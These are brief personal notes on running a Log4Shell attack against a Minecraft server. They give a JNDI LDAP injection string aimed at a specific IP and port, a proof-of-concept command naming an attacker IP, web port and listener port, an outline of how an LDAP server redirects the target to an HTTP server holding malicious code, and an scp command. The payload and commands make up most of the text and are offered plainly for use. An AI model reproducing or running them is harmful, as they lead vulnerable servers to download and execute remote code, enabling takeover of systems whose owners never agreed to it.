log4shell remote server ping command:
`${jndi:ldap://3.21.35.33:1389/a}`
`python3 poc.py --userip 3.21.35.33 --webport 8000 --lport 9001`
- 24.107.226.80
## Parts
### ldap server
- middle man between minecraft and http
- tells minecraft to request code from http server
- 
### Http server
- stores malicous code
- sends code to minecraft server

### 

`scp file.txt remote_username@10.10.0.2:/remote/directory`